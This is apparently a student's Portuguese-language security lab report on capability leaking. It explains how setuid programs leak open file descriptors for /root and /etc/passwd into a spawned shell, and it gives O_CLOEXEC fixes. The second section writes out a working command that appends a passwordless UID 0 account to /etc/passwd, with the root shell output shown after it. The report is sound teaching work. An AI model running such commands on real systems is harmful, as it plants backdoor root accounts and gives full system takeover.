# Semana 4 – Demonstração de Exploits Relativos a Controlo de Acesso

## Secção 1 – Capability Leaking

### Exercício 1

Execução do programa:

```
./backupssi
```

---

### Exercício 2

A vulnerabilidade de *capability leaking* ocorre porque o programa abre a diretoria `/root` com privilégios de *root* antes de reduzir os privilégios do processo.

O *file descriptor* obtido através da chamada:

```c
dfd = open("/root", O_RDONLY);
```

permanece aberto mesmo após a chamada:

```c
setuid(getuid());
```

Embora o processo deixe de correr como root, o *file descriptor* continua válido, permitindo a um utilizador normal aceder a uma diretoria protegida.

Quando o programa executa uma nova shell (`execve("/bin/sh", ...)`), essa shell herda o *file descriptor* aberto, permitindo ao utilizador normal aceder ao conteúdo da diretoria `/root`, o que constitui uma grave falha de segurança.

Este comportamento constitui uma vulnerabilidade conhecida como *capability leaking*.

---

### Exercício 3

Na shell lançada pelo programa é possível executar:

```
ls -la /proc/$$/fd/3
```

Este comando lista o conteúdo associado ao *file descriptor 3*, que corresponde à diretoria `/root`.

Assim, mesmo sem privilégios de root, o utilizador consegue aceder ao conteúdo da diretoria protegida, demonstrando a existência da vulnerabilidade.

---

### Exercício 4

Para mitigar a vulnerabilidade de *capability leaking*, foi adicionada a flag **`O_CLOEXEC`** à chamada da função `open()` sobre a diretoria `/root`.

Código corrigido:

```c
dfd = open("/root", O_RDONLY | O_CLOEXEC);
```

A flag `O_CLOEXEC` garante que o *file descriptor* é automaticamente fechado aquando da execução de uma função da família `exec()`.

Assim, quando o programa executa `/bin/sh`, a nova shell já não herda o *file descriptor*, impedindo a um utilizador normal o acesso à diretoria `/root`.

# Secção 2 – Elevação de Privilégio

### Exercício 1

Execução do programa:

```
./passwdleak
```

---

### Exercício 2

A vulnerabilidade decorre da abertura do ficheiro `/etc/passwd` com privilégios de root, em modo de escrita e anexação no final do ficheiro:

```c
int fd = open("/etc/passwd", O_WRONLY | O_APPEND);
```
Isto concede um *file descriptor* que permite adicionar conteúdo ao ficheiro `/etc/passwd`, que é um dos ficheiros mais críticos do sistema.

Mesmo após a chamada:

```c
setuid(getuid());
```

o *file descriptor* permanece aberto, e a shell executada de seguida herda esse descritor.

Assim, um utilizador normal passa a possuir um *file descriptor* com permissões de escrita em `/etc/passwd`, permitindo modificar este ficheiro.

---

### Exercício 3

Na shell executada pelo programa, foi executado o seguinte comando:

```
echo 'ssihacker::0:0::/root:/bin/sh' >&3
```

Este comando escreve diretamente no *file descriptor 3*, que corresponde ao ficheiro `/etc/passwd`, criando um novo utilizador `ssihacker` com permissões de *root* (UID 0 e GID 0). O utilizador é configurado para ter a sua diretoria home em `/root` e a shell `/bin/sh`.

---

### Exercício 4

Após adicionar o utilizador `ssihacker`, foi possível iniciar sessão como esse utilizador através do comando:

```
su ssihacker
```


Para verificar os privilégios do utilizador autenticado, foram executados os seguintes comandos:

```
whoami
```

Output:

```
root
```

e

```
id
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Os resultados demonstram que o utilizador `ssihacker` possui **UID 0**, correspondente ao utilizador *root*.

Desta forma, um utilizador inicialmente sem privilégios conseguiu criar um novo utilizador com privilégios de *root*, obtendo controlo total sobre o sistema. Este exploit compromete completamente a segurança do sistema, permitindo executar qualquer operação com privilégios máximos.


---

### Exercício 5

Para mitigar a vulnerabilidade foi adicionada a flag **`O_CLOEXEC`** à chamada da função `open()` sobre o ficheiro `/etc/passwd`.

Código corrigido:

```c
int fd = open("/etc/passwd", O_WRONLY | O_APPEND | O_CLOEXEC);
```

Esta flag garante que o *file descriptor* é automaticamente fechado aquando da execução de uma função da família `exec()`.

Assim, quando o programa executa `/bin/sh`, a nova shell já não herda o *file descriptor*, impedindo a escrita no ficheiro `/etc/passwd`.
